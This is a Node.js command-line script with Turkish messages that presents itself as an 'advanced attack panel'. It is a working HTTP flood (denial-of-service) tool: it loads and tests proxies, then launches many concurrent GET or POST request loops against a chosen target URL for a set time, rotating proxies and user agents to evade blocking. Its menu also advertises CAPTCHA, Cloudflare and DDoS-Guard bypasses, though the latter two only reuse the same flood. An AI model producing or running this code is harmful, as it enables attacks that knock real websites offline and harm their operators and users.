const fs = require('fs');
const readline = require('readline');
const axios = require('axios');
const colors = require('colors');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HCaptchaSolver } = require('hcaptcha-solver');
const { HttpsProxyAgent } = require('https-proxy-agent');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)...',
    'Mozilla/5.0 (X11; Linux x86_64)...',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X)...'
];

let proxies = [];

function getRandom(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

async function loadProxies() {
    try {
        const data = fs.readFileSync('proxies.txt', 'utf8');
        proxies = data.split('\n').map(p => p.trim()).filter(p => p.length);
        console.log(`🔌 ${proxies.length} proxy yüklendi!`.cyan);
    } catch (e) {
        console.log('⚠️ Proxy dosyası yüklenemedi.'.red);
    }
}

async function validateProxy(proxy) {
    try {
        const [host, port] = proxy.split(':');
        const agent = proxy.startsWith('socks')
            ? new SocksProxyAgent(`socks5://${host}:${port}`)
            : new HttpsProxyAgent(`http://${host}:${port}`);

        await axios.get('https://api.ipify.org', {
            httpAgent: agent,
            httpsAgent: agent,
            timeout: 3000
        });
        return true;
    } catch {
        return false;
    }
}

async function filterWorkingProxies() {
    console.log('🧪 Proxy testleri yapılıyor...'.yellow);
    const checks = await Promise.all(proxies.map(validateProxy));
    proxies = proxies.filter((_, i) => checks[i]);
    console.log(`✅ ${proxies.length} çalışan proxy bulundu.`.green);
}

async function sendAttackRequest(url, method, duration) {
    const endTime = Date.now() + duration * 1000;
    while (Date.now() < endTime) {
        const proxy = getRandom(proxies);
        const [host, port] = proxy.split(':');
        const agent = proxy.startsWith('socks')
            ? new SocksProxyAgent(`socks5://${host}:${port}`)
            : new HttpsProxyAgent(`http://${host}:${port}`);

        const headers = {
            'User-Agent': getRandom(userAgents),
            'Accept': '*/*',
            'Connection': 'keep-alive',
        };

        try {
            let response;
            if (method === 'GET') {
                response = await axios.get(url, {
                    headers,
                    httpAgent: agent,
                    httpsAgent: agent,
                    timeout: 5000,
                });
            } else if (method === 'POST') {
                response = await axios.post(url, { data: 'bypass' }, {
                    headers,
                    httpAgent: agent,
                    httpsAgent: agent,
                    timeout: 5000,
                });
            }

            process.stdout.write(`[${response.status}] `.green);
        } catch (err) {
            process.stdout.write(`[-] `.red);
        }

        await delay(Math.random() * 300);
    }
}

async function solveCaptcha() {
    const solver = new HCaptchaSolver();
    try {
        const result = await solver.solve({ sitekey: 'demo', url: 'https://hcaptcha.com/demo' });
        console.log(`Captcha token: ${result.token}`.green);
    } catch (e) {
        console.log('❌ CAPTCHA çözülemedi.'.red);
    }
}

async function startAttack(method, url, duration, threads) {
    await loadProxies();
    await filterWorkingProxies();

    if (proxies.length === 0) {
        console.log('Proxy bulunamadı, saldırı iptal edildi.'.red);
        return;
    }

    console.log(`🚀 Saldırı başladı! [${method}] → ${url}`.bold.green);
    console.log(`⏳ Süre: ${duration}s | 🔀 Thread: ${threads}`);

    const jobs = [];
    for (let i = 0; i < threads; i++) {
        jobs.push(sendAttackRequest(url, method, duration));
    }

    await Promise.all(jobs);
    console.log('\n✅ Saldırı tamamlandı.'.bold);
}

function showMenu() {
    console.clear();
    console.log('\n🌐 Gelişmiş Saldırı Paneli'.rainbow.bold);
    console.log('1. GET Flood');
    console.log('2. POST Flood');
    console.log('3. CAPTCHA Bypass');
    console.log('4. Cloudflare Bypass');
    console.log('5. DDoS-Guard Bypass\n');

    rl.question('Seçim (1-5): ', async (choice) => {
        if (choice === '3') {
            await solveCaptcha();
            rl.close();
            return;
        }

        rl.question('Hedef URL (http://...): ', (url) => {
            rl.question('Süre (saniye): ', (durationStr) => {
                rl.question('Thread sayısı: ', async (threadsStr) => {
                    const duration = parseInt(durationStr);
                    const threads = parseInt(threadsStr);
                    const methodMap = {
                        '1': 'GET',
                        '2': 'POST',
                        '4': 'GET',
                        '5': 'POST'
                    };
                    const method = methodMap[choice] || 'GET';
                    await startAttack(method, url, duration, threads);
                    rl.close();
                });
            });
        });
    });
}

showMenu();
